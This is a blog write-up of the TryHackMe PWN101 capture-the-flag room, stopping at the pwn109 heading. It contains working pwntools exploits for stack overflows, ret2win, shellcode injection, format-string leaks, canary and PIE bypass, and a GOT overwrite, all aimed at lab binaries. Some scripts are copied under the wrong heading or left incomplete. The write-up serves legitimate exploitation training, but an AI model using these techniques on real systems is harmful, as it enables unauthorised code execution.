---
title: (TryHackMe) - PWN101
author:
  name: eng4ge
  link: https://github.com/an9k0r
date: 2022-10-26 09:00:00 +0200
categories: [Binary Exploitation, CTF]
tags: [Notes, Binary Exploitation, CTF]
math: true
mermaid: true
image:
  src: /assets/images/4bada98203bf1c5f6b6dc7b2ea8480cc8fa44360b26ea15eda997c64462b16c0.png
  width: 694
  height: 515
  alt: image alternative text
---
This is all about Binary Exploitation. As i haven't done that in a while i thought it would be nice to go back to TryHackMe and do some challenges there. I can only recommend the [PWN101](https://tryhackme.com/room/pwn101) as it's about the right level for a refresher but it expects some knowledge to already be there so beware. Choose another room if you feel lost!

# PWN101.pwn101 - Stack BOF - Straight to System Shell

>  This should give you a start: 'AAAAAAAAAAA'
>  
>  Challenge is running on port **9001**

When we start the binary we see following text:

![picture 2](/assets/images/6e1a9c31d0be98760f8130629358ba006c6b6cf39f6d9657c828c42d74bb076e.png)  

Binary asks for input and prints something after we press enter.

![picture 3](/assets/images/dc049e888922e8dad5748e6357977f7f2d59bba3cb1b3d67b0fc031d4a745b27.png)  

If we enter longer string, we get dropped to a shell

![picture 4](/assets/images/d150c2d62c8f37fdebbcdfbbe1ccace06d0f2e3e2ff97c55cd28849440ab1a83.png)  

## File 

```bash
luka@yurei:~/Desktop/thm$ file pwn101.pwn101 
pwn101.pwn101: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=dd42eee3cfdffb116dfdaa750dbe4cc8af68cf43, not stripped
```

Binary is **dynamically linked** and it's **not stripped**
## Checksec

![picture 5](/assets/images/3ba43034960ac4f0e22da9dbead4b966106503f33bea83563d8fb6dc8c27d48a.png)  

## Disssasembly

![picture 6](/assets/images/4714e8be86437be4443f3964465b9bd179d0faa3b3e6ca6ee371b5b4cffbcdf5.png)  

We have function `gets` which can get overflown buffer. Input comes from the variable `var char +s @ rbp-0x40`. With 40 bytes/characters we fill the buffer.

Right below we have compare function (an if statement):
(*dissasembly view below!*)

![picture 7](/assets/images/8f3ca7c676616a4a0370bcc4a20bc0c74a79ef516120977dbd3240b9f94423f8.png)  

To solve the lab, we just need to overwrite the `var_4h` or the `0x539` value which resides at `rbp-0x4`.

![picture 8](/assets/images/29d3a56d2459893d36e44b4680ab55be4f320bfb226bfc37bbb95ae8130de708.png)  

As our stack starts growing at rbp-0x40 we need to add somewhere beetween (0x40-0x4) and additional 1-3 Bytes to overwrite the `var_4h`.

## Exploit (local)
```python
from pwn import *

context.binary = binary = './pwn101.pwn101'

padding_needed = 0x40-0x4
padding = "\x41"*padding_needed
junk = "\x42"

payload = padding + junk

proc = process('./pwn101.pwn101')
proc.recvline('Type the required ingredients to make briyani:')

proc.sendline(payload)
proc.interactive()

```

![picture 9](/assets/images/3f49bc0fc9e942f042dd255b88db994c2005c9ea68393d6131f31288f2ec0eb8.png)  

## Exploit (remote)
```python
from pwn import *

context.binary = binary = './pwn102.pwn102'

padding_range = 0x70-0x08
padding = "\x41"*padding_range

# code = 0x0000c0d3 => \xd3\xc0\x00\x00
# coffee = 0x00c0ff33 => \x33\xff\xc0\x00
code = "\xd3\xc0\x00\x00"
coffee = "\x33\xff\xc0\x00"

payload = padding + code + coffee

proc = process('./pwn102.pwn102')
proc.recvline('Am I right?')
proc.send(payload)
proc.recv()
proc.interactive()
```

![picture 10](/assets/images/c5e17fcb3ef0d9f2c1d49dbdd49aaf1d5566e3b35c19b8da824c214cbd55af98.png)  

Binary has been pwned

# PWN102 - Stack BOF - Simple Execution Flow Change
> The challenge is running on port 9002

Let's download the binary and check it locally.

It's again a simple authentication that expect text input from us

![picture 11](/assets/images/003df1b581a89c05ab5020eb4986a4c9396a786fb8734ebf47423d37470f28ee.png)  

It's not that simple to crash it as the binary in the PWN101 so we're going to have a deeper look.

## File

![picture 12](/assets/images/37fb0b757972cad0da86881069b2f1dccc6f4d2b9e18916da0c750fa1fd4b585.png)  

Binary is dynamically linked and not stripped!

## Checksec

![picture 13](/assets/images/88c3319838283ab5a2511226b7ac3c24a98027a42584699b106749f48d146b56.png)  

## Dissasembly in cutter
Let's load the binary into cutter and check the main function and start from there.

![picture 14](/assets/images/c0b7dab7ed563560448a62ce4f41a107e787ba8f7b48724dc56fe9d812134ba7.png)  

We have 3 variables, 2 functions which are:

- setup
- banner

And there comes `printf` which might be interesting if any **format string vulnerabilities** are present. I'll switch to Decompiler to have a better look.

![picture 15](/assets/images/9a08cba0a20d9ad70f89c1e341e886d824c449d2107b973b6d84329537173945.png)  

As it can be seen above, the `printf` is just printing strings.

Our input get's however loaded to `scanf`function, and there comes If statement into play. 

First of all, scanf is vulnerable. I've loaded the breakpoint address from the if statement into GDB `b *main+148` and did notice that some pointers and stack was overflown.

![picture 16](/assets/images/252177ee82286a891e1bcece39f071ec816b58d16aaa8eb972ada8c6a097b64c.png)  

Now onto the exploit.

Remember the variables:

- var_4h = 0xbadf00d
- var_8h = 0xfee1dead

Two subsequent IF statements want coffee and code:

- var_4h == 0x00c0ff33
- var_8h == 0x0000c0d3

If we calculate their positions, we can change the variables so we get that system call. We have c0f3 at ebp 0x70-0x8 and c0ff33 right afterwards (0x70-0x04).

## Exploit (local)
```python
from pwn import *

context.binary = binary = './pwn102.pwn102'

padding_range = 0x70-0x08
padding = "\x41"*padding_range

# code = 0x0000c0d3 => \xd3\xc0\x00\x00
# coffee = 0x00c0ff33 => \x33\xff\xc0\x00
code = "\xd3\xc0\x00\x00"
coffee = "\x33\xff\xc0\x00"

payload = padding + code + coffee

proc = process('./pwn102.pwn102')
proc.recvline('Am I right?')
proc.send(payload)
proc.recv()
proc.interactive()
```

![picture 17](/assets/images/ab981d4d0a19c06e62e285b7de1f1367974955898fe901ac193346f1c2b7c233.png)  

## Exploit (Remote)

```python
from pwn import *

context.binary = binary = './pwn102.pwn102'

padding_range = 0x70-0x08
padding = "\x41"*padding_range

# code = 0x0000c0d3 => \xd3\xc0\x00\x00
# coffee = 0x00c0ff33 => \x33\xff\xc0\x00
code = "\xd3\xc0\x00\x00"
coffee = "\x33\xff\xc0\x00"

payload = padding + code + coffee

#proc = process('./pwn102.pwn102')
proc = remote('10.10.227.21',9002)
proc.recvline('Am I right?')
proc.send(payload)
proc.recv()
proc.interactive()
```

![picture 18](/assets/images/e7d97cb456895668c07afd683e30f2225149ca4afbb3753ba71be3cae7cb7c5d.png)  

# PWN103 - Hijack Execution Flow (BOF) - Ret2Win

> The challenge is running on port 9003

Simply by running the binary, we get a menu. While choosing `3) General`  we get `Segmentation fault`

![picture 19](/assets/images/59b53b3195fa6e3503cfb0c5794bbb689d0af929afa2dbeb3c878f814a7cf1cc.png)  

## File

```
luka@yurei:~/Desktop/thm/pwn103$ file pwn103.pwn103 
pwn103.pwn103: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3df2200610f5e40aa42eadb73597910054cf4c9f, for GNU/Linux 3.2.0, not stripped
```

## Checksec

![picture 20](/assets/images/d72158b7a2e2889b334933daa577e556d27c8a13e69235c97833ae220513ac6b.png)  

## Analysis
Let's check decompiler first, for the sake of readibility, as the codebase is pretty big.

### Main
We can see that we have switch. 
Spoler alert, the one with vulnerability is the `General()`!

![picture 21](/assets/images/93e4dab0a11428a98551c37c92b97afa2d196a625963ff7c934f769eddc92f64.png)  

### General
We have scanf function that takes our input...

![picture 22](/assets/images/107439617164b35e9d8b2a31fe283766b4d7096d31b6044b17a1914c2cebc98f.png)  

... and is declared as string format specifier. We can enter as much characters/bytes as we want.

![picture 23](/assets/images/58c1fa16f9532792899ee45c1a82ebed45fa8596b97f44c1a6108f0c732a7551.png)  

Note that in the end of the General function there is a compare, and if we check the address in hexdump, we'd find the string `yes`

![picture 25](/assets/images/569486e9e45244df41694f2bcb6371269a24fa445954b6b600576a5046224cf3.png)  

In addition to all of that, there is `Admins_only` function which is the one we want to solve this CTF

### Admins_only
This is decompiled code

![picture 26](/assets/images/dbd73f2c5bfe018354fcd027e088997ac1293d2b49909bf95803b4d4f7d8cab6.png)  

How can we get into the `Admins_only` function? We can abuse `scanf` function in `general`. We can write to `*s1` variable, which resides at `rbp-0x20` . From there we can overwrite the return address of `general` function that was put onto the stack and make it return to `Admins_only` function instead. 

In order to reach the return address, we need 8 more bytes (64-bit!) so 28 in total.

Because of [MOVAPS](https://www.cameronwickes.co.uk/stack-alignment-ubuntu-18-04-movaps/) issue we can add another RET instruction before actual payload call.

## Exploit (local)

```python
from pwn import *

context.binary = binary = ELF("./pwn103.pwn103")

#p = process()
p = remote("10.10.16.17",9003)

p.sendline(b"3")
#admins_only_address = p64(0x00401554)
# alternative call

admins_only_address = p64(binary.symbols.admins_only)

ret_instruction = p64(0x00401377)

# payload before MOVAPS - adding ret_instruction
#payload = b"A"*0x20 + b"B"*0x8 + admins_only_address

# payload after fixing the bug
payload = b"A"*0x20 + b"B"*0x8 + ret_instruction + admins_only_address


p.sendline(payload)

p.interactive()
```

## Exploit (remote)

```python
from pwn import *

context.binary = binary = ELF("./pwn103.pwn103")

#p = process()
p = remote("10.10.16.17",9003)

p.sendline(b"3")
#admins_only_address = p64(0x00401554)
# alternative call

admins_only_address = p64(binary.symbols.admins_only)

ret_instruction = p64(0x00401377)

# payload before MOVAPS - adding ret_instruction
#payload = b"A"*0x20 + b"B"*0x8 + admins_only_address

# payload after fixing the bug
payload = b"A"*0x20 + b"B"*0x8 + ret_instruction + admins_only_address

p.sendline(payload)

p.interactive()
```

![picture 27](/assets/images/533f858df18c62e27d0bbd90775eb0224d14b59ebc7ecdda4a72be337f3da890.png)  

# PWN104 - Stack BOF - Ret2Shellcode

> The challenge is running on port 9004

After downloading the binary let's check what that appliation does?

![picture 28](/assets/images/b5456a1e0512ff16198b9545b8baa68ac1dd404075c92ab35572f4aadd96f87e.png)  

Looks like another buffer overflow. When running binary few times, we can notice that that address that is provided to as in `... i'm waiting for you at...` changes with every execution

![picture 29](/assets/images/18a7d55afaad1d1be5ebd2b77a533e1e4416b5266c9f6c95f5547368668cc7ac.png)  

We have to deal with ASLR here.
Another way to check this would be to check the address of Dynamic Linker
```
ldd pwn104.pwn104
```

## Checksec and File check

![picture 30](/assets/images/ae9ac323824363707689b1c2c728ff07b9f33f9a06d7c2c024df9e9eaccdc280.png)  

## Analysis

![picture 31](/assets/images/17a215330f73e7d62905589f0fdd0a43aaf67b289c4553be890ffe0b046b8b6b.png)  


Buffer overflow is in the Read function
So, we know what we will overwrite - Buffer (`*buf`) starts at `rbp-0x50`, but we musst know it's address if we want to return to it. 

Remember that binary is printing some addresses, but what is it printing exactly? => it's the pointer to the buf ( see the printf function above)

Another thing to point out here is what gives us permission to execute custom shellcode from the stack? ==> NX is disabled!

This code was used to test the poinrer to the `*buf` position using the leak that is there to help us ;)

```python
from pwn import *

context.binary = binary = ELF('./pwn104.pwn104')

p = process()

addr_leak = p.recv()

addr_main = addr_leak.split(b"at")[1].decode("utf-8")

print(addr_main)

# This prints the address in HEX format
```

Shellcode: https://www.exploit-db.com/exploits/42179

## Exploit (local)

Notice how the leaked pointer address was splitted and converted to hexadecimal!
```python
from pwn import *

context.binary = binary = ELF('./pwn104.pwn104')
context.log_level = "debug"
# Size 23B - source: https://www.exploit-db.com/exploits/46907
shellcode=b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
p = process()

addr_leak = p.recv()

addr_buf_pointer = int(addr_leak.split(b"at")[1].strip().decode("utf-8"),16)

#print(addr_buf_pointer)

payload = shellcode + b"A"*(0x50 - len(shellcode)) + b"B"*0x8 + p64(addr_buf_pointer)

p.sendline(payload)

p.interactive()
```

## Exploit (remote)

```python
from pwn import *

context.binary = binary = ELF('./pwn104.pwn104')
#context.log_level = "debug"
# Size 23B - source: https://www.exploit-db.com/exploits/46907
shellcode=b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
p = process()
p = remote("10.10.109.228",9004)

p.recv()
addr_leak = p.recv()

addr_buf_pointer = int(addr_leak.split(b"at")[1].strip().decode("utf-8"),16)

#print(addr_buf_pointer)

payload = shellcode + b"A"*(0x50 - len(shellcode)) + b"B"*0x8 + p64(addr_buf_pointer)

p.sendline(payload)

p.interactive()
```

Same code was used for remotely, execpt there was another `p.recv()` needed which had to be debugged using `context.log_level = "debug"`

![picture 32](/assets/images/c9d05bd48aecfceda19b9d4624ca91bb2538eb7ccd4cb5ed98624bc43b095c0d.png)  

# PWN105 - Integer Overflow/Underflow

> The challenge is running on port 9005

## File and Checksec

![picture 33](/assets/images/b205c49ff59162cfafb1ce0c1e7883866b1e2ec05555f175cec5e2f58d27111b.png)  

## Analysis
There are no special functions of interest, so let us sheck the `main` function.
There are 2 scanf which are the ones that load our input to memory.

![picture 34](/assets/images/701c527855ffe1d3f31040ef94e046d8a1fb16f794b9ca251182befaa8b7a02c.png)  

If we check the `0x000216f`  in hexdump we can see that both point to with `%d` format specifier. `%d` stands stands for signed integer (negative AND positive).

![picture 35](/assets/images/7a8bfe25e57316b54ff5e741b3cf9ace4c5c974bc246717034c332174e488404.png)  

- 0x00012fb both values are added and are saved on 0x000012fd into `var_ch`.
- 0x00001303 compares if both signs are positive

If we check the rest of the execution flows, we can locate system call which is where we want to get to.

![picture 36](/assets/images/7a910e6de2aee4bc3fe251cdb2b5fa662de370d8dad0c4bc2e4d03840e86da88.png)  

- 0x0000130a - `var_10h` is checked again if signed = if positive

- Regarding CMP operand at `0x0000130e`: 
> Compares the first source operand with the second source operand and sets the status flags in the EFLAGS register according to the results. The comparison is performed by subtracting the second operand from the first operand and then setting the status flags in the same manner as the SUB instruction. When an immediate value is used as an operand, it is sign-extended to the length of the first operand. 
> ...
> The CF, OF, SF, ZF, AF, and PF flags are set according to the result
> 
> [REFERENCE](http://www.jaist.ac.jp/iscenter-new/mpc/altix/altixdata/opt/intel/vtune/doc/users_guide/mergedProjects/analyzer_ec/mergedProjects/reference_olh/mergedProjects/instructions/instruct32_hh/vc36.htm)

- 0x00001312 checks if signed (sf=1) => the result **this is the point where we need negative result to get to the branch with system function**

We are aiming at Integer overflow/underflow. I've personally had to deal with the same concept here: http://cybersec-research.space/posts/Bussines-Logic-Vulnerabilities/#low-level-logic-flaw---integer-overflow

If we overflow the left-most bit of the signed integer, we will endup with a negative value.

## Exploit 
To solve the lab we musst add (>=1) to the highest possible **positive** number of signed integer in 32-bit space => **2147483647**

This will work on remote machine as well.
![picture 37](/assets/images/55d55771f13f3407505fbbbea05d7c728257309c741d3094df8a090c6268a687.png)  

# PWN106 - Format String Vulnerability - Reading the Stack

> The challenge is running on port 9006

Download the lab and run it to check what we're dealing with.

![picture 38](/assets/images/39be7bf89db175304acf1aa88f5e4a36956e2dbe3af4f86de56d2fbbca930aa6.png)  

We have print format vulnerability as we're leaking memory as seen above.

## File
64-bit, dynamically linked and not stripped

![picture 39](/assets/images/9d24d4ed8c1740afaca1e9182562195f04d09e4fcf3e4f9e90474d728b1e8db9.png)  

## Checksec

![picture 40](/assets/images/fa44fd467e912b35bf61fbdf3519ce46cf1c77631eddc7ce09f85a5f0d86f0c7.png)  

## Dissasembly
We can see flags placeholder on the stack, so we'll try to leak memory here.

![picture 41](/assets/images/c0a70bae2b1047a2a372df5a6e846bae7a98cd2bad49a8a04e746e7076300fa0.png)  

Calling convention in x64 bit stack => RDI, RSI, RDX, RCX, R8, R9 and then Stack!

## Exploit local
Link to calling convetion ==>

Let's try to leak some data.
```python
from pwn import *

context.binary = binary = './pwn106user.pwn106-user'

#payload = "%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX"
payload = "%6$lX.%7$lX.%8$lX.%9$lX.%a$lX"
conn = process('./pwn106user.pwn106-user')
conn.recv()
conn.sendline(payload)
result= conn.recvall()
print(result)

```

![picture 42](/assets/images/103becf7a25f30f4e9f0ccbdb096b126691ec7562718927d8dd9b244ffa8c599.png)  

Relevant data starts at 6th position until 10th. Bytes needs to be compared to actually match the ascii representations.

```python
from pwn import *

context.binary = binary = './pwn106user.pwn106-user'
conn = remote('10.10.93.168',9006)
#payload = "%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX.%lX"
payload = "%6$lX.%7$lX.%8$lX.%9$lX.%10$lX.%11$lX"

conn.recv()
conn.sendline(payload)
result= conn.recvall()
print(result)
```
Using script we get the flag. Decoding was done using Cyberchef.

![picture 43](/assets/images/5ba78b8d9ecb9b1b847f88c1b1c2eafb24f5d8b122ee1b42fed8a9bfc1886432.png)  

## Exploit Remote
```python
Scripts comes here!
```

![picture 44](/assets/images/6531a76cfaed068d8329c7440c56c329b4d67a007d6b294a66c71ee3984e584c.png)  

Putting output to the cyberchef shows the flag.

![picture 45](/assets/images/1accd7709e9959988f8d9e36efda1f3d178f74423df94f4d7351e2b5a821f648.png)  

# PWN107 - Format String Vulnerability - PIE and Canary Bypass

Download the lab and check what is all about

![picture 46](/assets/images/e04079ca950e332960b2d58ecb2e0659b03868912f13f23552a754eae7c03711.png)  

Typing simple `%x` leaks a memory address.

![picture 47](/assets/images/01423e9619a1721eb75df6a61438039134fbe3bd23d28a6cca1ab0fbce4f510d.png)  

## File

![picture 48](/assets/images/6fb58ab030ae263c69670d5967df4a4aca9ed0fa5a97041d1a1b0ef8e6ee97b1.png)  

## Checksec

![picture 49](/assets/images/dd6917c3d114c6772c7a9da8f12126e308ced354e383a39fa6a7d2ee0165d5db.png)  

## Analysis

![picture 50](/assets/images/d1c0c7204084569482acbbc25246aea5f8c3d656fc45b2f7e1faa69fda642745.png)  

The second variable `*buf` takes in 0x200 where only 0x20 were allocated to.

There is also a function that isn't called from the execution flow perspective and this is the `get_streak` function which also has `system` function in it which calls shell.

![picture 51](/assets/images/0b715b715b8a7f2d8949203854c40df59c21d3b4940d9b8458fec6091e9008cf.png)  

Canary resides at `rbp-0x8` so in order to overwrite it we would need to know it's value beforehand. Do we have Format String vulnerability before the `Read` function? Yes we do!

![picture 52](/assets/images/9c5b7876e9c6c73f62203fbaabdbe3c8dceb70db145c9cee081f1aabbc2f5d41.png)  

To leak the addresses now, we need to start debugging. I'll use radare2 debugger as razvi uses in his video https://www.youtube.com/watch?v=FpKL2cAlJbM

Start the binary: `radare2 -d -A pwn107.pwn107`

I'll leave a cheat-sheet below because i also tend to forget the commands used for each debugger!

This is now `main` function loaded in radare2. Use `pdf @ main` to print it.

![picture 53](/assets/images/1d1dee2f6d049407b0f1d2ec206e5b283ca1337d968dd19ca1e1e8340170f935.png)  

Now let's set the breakpoints where our printf vulnerability call starts and after it.

```
[0x7fa225a1e2b0]> db 0x557397c00a25
[0x7fa225a1e2b0]> db 0x557397c00a2a
```

Start with execution using `dc`

![picture 54](/assets/images/84fadebc05ea6b15b410481700f693b2710bba93532d3b146010a8d68eca22ea.png)  

As we've hit the breakpoint let's read the stack using `pxr @ rsp`. Below i've raked the RSP and RBP pointers.**Stack direction is displayed upside down!**

![picture 55](/assets/images/f93a667e42a9f71b4699531b972234461156b87c3e97e210c6a2d9035b30b8bd.png)  

We can now see where canary and other variables are at, at this point of execution. Canary is at RBP-0x8. If we chose to overwrite it, we would also need to return back to the function (main). 

We can't use  the return adress of main because this points to libc_so.6 so we need to return somewhere in the main function! We can use `dm` memory map to see to which process one address belongs.

![picture 56](/assets/images/4aae335813d2d76b9addb723243dacfa8235998aa5909f040b3c1ff13d0d6f6b.png)  

We should take one that belongs to `pwn107.pwn107` and also stays on the on the stack after we write onto stack through `read` functon

## Exploit - 1st Part => Format String Vulnerability Leak

Now to leak simple addresses we run into how-much-space-do-we-have problem. It's 20Bytes.

![picture 57](/assets/images/4ccfd665dcddf47e054c26402243dabe967f5bca23fb7e7c6e2ebd8e1b7978a8.png)  

We leak the addresses from 6th position - Notice the 0x44434241!

If we now want to leak 7th and 11th position from top of the RSP (7th = canary, 11th = function to return to) we just need to add 6th. Let's test this in debugger! We will leak 13th and 17th position respectively!

![picture 58](/assets/images/423171e5f8615ff8aff4008fb2155d9f9e19ca3c14e32c68540dab9b26b5ea79.png)  

Now after running following script, the leaks seem right
```python
'''
Exploit starts with format string vulnerability with first entry (Read function). It can read only 20 Bytes.
It was calculated that canary leaks at 13th position 
and the function to return to at 17th.
'''
from pwn import *

context.binary = binary = ELF("./pwn107.pwn107",checksec=False)

# This serves just to get the offset from the start of the binary
static_libc_csu_address = binary.symbols.__libc_csu_init

print("Address of static libc csu init: {}".format(hex(static_libc_csu_address)))

p = process()
p.recvuntil(b"streak?")

payload = b"%13$lX.%17$lX"
p.sendline(payload)

p.recvuntil(b"streak:")

output = p.recv().split(b"\n")[0]

print(output)
```

![picture 59](/assets/images/675add9f7fffed28be03672bd2621505b76b7d9bee31c0502794c6b20ee0b170.png)  

To fix the formatting of the leaked addresses, script was modified. 

```python
'''
Exploit starts with format string vulnerability with first entry (Read function). It can read only 20 Bytes.
IT was calculated that canary leaks at 9th position and the function to return to at 17th.
'''
from pwn import *

context.binary = binary = ELF("./pwn107.pwn107",checksec=False)

# This serves just to get the offset from the start of the binary
static_libc_csu_address = binary.symbols.__libc_csu_init
static_main_address = binary.symbols.main

print("Address of static libc csu init: {}".format(hex(static_libc_csu_address)))
print("Address of static main function: {}".format(hex(static_main_address)))

p = process()
p.recvuntil(b"streak?")

payload = b"%13$lX.%17$lX"
p.sendline(payload)
#print("Payload to leak Canary and Func: {}".format(hex(payload)))
p.recvuntil(b"streak:")

output = p.recv().split(b"\n")[0]

print("Leaked Addresses (unformated): {}".format(output))

dynamic_main_address = int(output.split(b".")[1].strip(), 16)
canary_address = int(output.split(b".")[0].strip(), 16)

print("Dynamic Libc: {}".format(hex(dynamic_main_address)))
print("Canary: {}".format(hex(canary_address)))

# Output
#Leaked Addresses (unformated): b' 6C70AC6BD4259200.565120E00992'
#Dynamic Libc: 0x565120e00992
#Canary: 0x6c70ac6bd4259200

'''
In order to get the base address of the binary, we muss subtract static from dynamic address!
'''

dynamic_base_address = dynamic_main_address - static_main_address
binary.address = dynamic_base_address

print("New binary address starts now at: {}".format(hex(dynamic_base_address)))

# From this point on it's all about buffer overflow 
```

Important takeaway here is:
> IF we substract static base address from dynamic address that was leaked, we get a base address of the binary. 
> 
> I recommend following post which explains the offsets very well: https://www.politoinc.com/post/return-to-libc-linux-exploit-development

## Exploit - 2nd Part = Buffer Overflow
Regarding Buffer oveflow this is the part where it happens:
```
; var const char *format @ rbp-0x40
; var void *buf @ rbp-0x20
; var int64_t canary @ rbp-0x8
```

![picture 60](/assets/images/ff2cd07c6616ccbde2c2c868d34b25c1ae9d45856d2da9ee15258c9e46cc2ac3.png)  

To recap, input will be put into `*buf` at `rbp-0x20` and up to 200 bytes can be written. At `rbp-0x8` we reach the canary, which we will need to rewrite.

To calculate the bytes we can use calculator which gives us `0x18`
```
0x20 - 0x8 = 0x18
```
Or do it with python script directly.

![picture 61](/assets/images/72344b8caef9ee0c1e65d27b4f8c17f8c7ac7a2f03537fc6677e19f807c896e1.png)  

```python
'''
Exploit starts with format string vulnerability with first entry (Read function). It can read only 20 Bytes.
IT was calculated that canary leaks at 9th position and the function to return to at 17th.
'''
from pwn import *

context.binary = binary = ELF("./pwn107.pwn107",checksec=False)

# This serves just to get the offset from the start of the binary
static_main_address = binary.symbols.main

print("Address of static libc csu init: {}".format(hex(static_libc_csu_address)))
print("Address of static main function: {}".format(hex(static_main_address)))

p = process()
p.recvuntil(b"streak?")

payload = b"%13$lX.%17$lX"
p.sendline(payload)
#print("Payload to leak Canary and Func: {}".format(hex(payload)))
p.recvuntil(b"streak: ")

output = p.recv().split(b"\n")[0]

print("Leaked Addresses (unformated): {}".format(output))

dynamic_main_address = int(output.split(b".")[1].strip(), 16)
canary_address = int(output.split(b".")[0].strip(), 16)

print("Dynamic Libc: {}".format(hex(dynamic_main_address)))
print("Canary: {}".format(hex(canary_address)))

# Output
#Leaked Addresses (unformated): b' 6C70AC6BD4259200.565120E00992'
#Dynamic main: 0x6c70ac6bd4259200
#Canary: 0x565120e00992

'''
In order to get the base address of the binary, we muss subtract static from dynamic address!
'''

dynamic_base_address = dynamic_main_address - static_main_address
binary.address = dynamic_base_address

print("New binary address starts now at: {}".format(hex(dynamic_base_address)))

# From this point on it's all about buffer overflow 
# Remember, we want to get into the get_streak function!
dynamic_get_streak = binary.symbols.get_streak

## Implant the RET Gadget since running it on Ubuntu
rop=ROP(binary)
ret_gadget= rop.find_gadget(['ret'])[0]

payload = b"A"*0x18 + p64(canary_address) + b"B"*8 + p64(ret_gadget) + p64(dynamic_get_streak)
p.sendline(payload)
p.interactive()

```

# PWN108 - Format String Vulnerability - GOT Overwrite
Download the file and run it to see what we're up against (in case we can notice something!)

![picture 62](/assets/images/bad3df2a38a5a2d2fca7d8d832ab870eca5abc3ecd643db254578c977621f3f3.png)  

We are asked for 2 inputes (name, register no.). Name seems normal at the first glanze where `Register No.` leaks memory.

## File

![picture 63](/assets/images/5020644d75bce61554446bd3ba469ba66d214fef976540b620a3001db75ceeae.png)  

## Checksec

![picture 64](/assets/images/cd347b3ba2c2b0929adc197a82ea458416d15112bb70f116c8171d942f5a4513.png)  

## Finding the vulnerability (Decompiler)

![picture 65](/assets/images/736d7679c0d3a0d023dbf4020e05ab5bd202b46ea0634259ad2d844da027a270.png)  

So we've found the canary and where the vulnerability exists. 
At the end of the main function, there's a IF statement

![picture 66](/assets/images/6936014be13136c7c101733b44f7dd20bd05aeedb99e7a4a75adb7f3e612ace4.png)  

One returns to some address and another one is a fail. This is canary check, but there is another function Holidays() which has system function in it. This is where we want to return!

![picture 67](/assets/images/4342c8e6e43dea09fdc5e6319ea4f03cbc15ea0533b315a2de6f09b9a0219fc3.png)  

Regarding GOT overwrite itself. We will rewrite `puts` function as it does not appear in the `holidays()` function as `printf` does!

## Exploitation
First we must find the position where our input get's injected onto the stack.

![picture 68](/assets/images/7d5c2a79587735883d6854d98151c05b4f60821c19c0a0170f08dbbb16002b3f.png)  

Let's write the Puts GOT address into the 10th position using format string vulnerability

```python
from pwn import *

context.binary = binary = ELF("./pwn108.pwn108", checksec=False)

# PWNTools will get the offset from the binary!
got_puts_address = binary.got.puts
print("GOT puts address has an offset of {}".format(hex(got_puts_address)))

junk_payload = b"A"*0x12
```

After Explanation from Razvi  ==> https://www.youtube.com/watch?v=9SWYvhY5dYw&t=845s we can calculate the number of bytes to write by subtracting written bytes so far with desired value!.

Format specifier `%x` prints integers as hexadecimal!

```
payload = p64(got_puts_address) + b"%10$n"
```

Since put Address has 0x00 in it, we have to turn the payload around.

```
payload = b"%40X%12$nAAAAAAA" + p64(got_puts_address)
```

We need `AAAAAAA` in order to fill the bytes and with that our got_puts_address comes at the 12th position

```python
from pwn import *

context.binary = binary = ELF("./pwn108.pwn108", checksec=False)

# PWNTools will get the offset from the binary!
got_puts_address = binary.got.puts
print("GOT puts address has an offset of {}".format(hex(got_puts_address)))

#fill the read buffer. If my understanding is correct, we could also use readuntil from pwn tools and give an input here, but result should be the same.
junk_payload = b"A"*0x12

#payload = p64(got_puts_address) + b"%10$n"
#Turn the address around to avoid stopping reading because of null bytes
payload = b"%40X%12$nAAAAAAA" + p64(got_puts_address)
with open("payload", "wb") as f:
	f.write(junk_payload)
	f.write(payload)
```

The script above will write a payload to a file, which can be ingested to Radare2

Payload can be read in radare like this
```
radare2 -R stdin=payload -d -A pwn108.pwn108
```

Set breakpoints where vulnerable `printf` function resides and on the instruction after using `db 0x12312312` command.

![picture 69](/assets/images/c8fce63cc3f28197ed0de54894a3c5c55e09610bcb355cc9cc808297bd67d590.png)  

We've hit the breakpoint. We can check if the location from puts has been filled using `pxr @ section..got.plt`

![picture 70](/assets/images/b7e4fa192c4436881089ede25303cbdd7647a1c629accab3ba2dca945dd2eb8d.png)  

If we continue the execution and check the puts value again in the `got.plt` we have the value that we've overwritten with, but only the first 4 bytes. This is because `%n` format specifier only writes 4 bytes by default.

![picture 71](/assets/images/a393e13fd90085442ae4a5f6f028da815df87708b9375797bb944fd34ce0f9a5.png)  

To overwrite the full value, we just have to conduct 2 writes instead of the single one.

`Holiday()` function starts at `0x40123b`

To better understand this, i've used following resource which explains this topic really well: https://axcheron.github.io/exploit-101-format-strings/

We will rewrite the payload as following. 
```python
from pwn import *

context.binary = binary = ELF("./pwn108.pwn108", checksec=False)

# PWNTools will get the offset from the binary!
got_puts_address = binary.got.puts
print("GOT puts address has an offset of {}".format(hex(got_puts_address)))

#fill the read buffer
junk_payload = b"A"*0x12

#payload = p64(got_puts_address) + b"%10$n"
#Turn the address around to avoid stopping reading because of null bytes

'''
Number of bytes to write = Desired value - bytes written so far

1st write = (0x40) 64 - 0 = 64
2st write = (0x123b) 4667 - 64 = 4603
'''
### AAA is used for padding 
payload = b"%64X%13$n" + b"%4603X%14$hnAAA" + p64(got_puts_address+2) + p64(got_puts_address)

'''
with open("payload", "wb") as f:
	f.write(junk_payload)
	f.write(payload)
'''

p = process()
p = remote("10.10.94.223",9008)
p.send(junk_payload)
p.send(payload)

p.interactive()
```

# PWN109 - Stack BOF - Ret2Libc

> The challenge is running on port 9009

Let's download the binary and start it. 
Binary throws an `Segmentation fault` error if we add longer input

![picture 72](/assets/images/4e410b179f06a242353e55772eb72950ee272489ec765b3299f3f2bb151e5381.png)  

## File and Checksec

![picture 73](/assets/images/2db56218634773d699cce489006bf3e5510bceb783f12f42c1b39d23627ed742.png)  

## Analysis
### Cutter Dissasembly

